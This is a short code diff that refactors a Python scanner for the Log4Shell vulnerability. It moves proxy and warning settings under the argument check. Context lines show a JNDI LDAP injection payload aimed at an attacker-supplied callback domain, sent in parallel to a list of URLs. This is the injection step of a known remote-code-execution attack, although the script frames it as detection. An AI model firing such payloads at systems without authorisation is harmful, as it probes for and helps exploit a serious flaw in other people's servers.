@@ -3,11 +3,6 @@ from requests import get
 from urllib3 import disable_warnings
 from concurrent.futures import ThreadPoolExecutor
 
-disable_warnings()
-
-proxies = {}
-# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
-
 def sendDetectionRequest(url, urlId):
     try:
         payload = '${jndi:ldap://' + str(urlId) + '.' + argv[2] + '/a}'
@@ -20,9 +15,15 @@ def sendDetectionRequest(url, urlId):
         print(e)
         pass
 
-threads = []
-urlId = 0
 if len(argv) > 1:
+    disable_warnings()
+    
+    proxies = {}
+    # proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"} # Uncomment in case you want to pass traffic via Burp Proxy
+
+    threads = []
+    
+    urlId = 0
     urlFile = open(argv[1], 'r')
     urlList = urlFile.readlines()
     with ThreadPoolExecutor(max_workers=15) as executor:
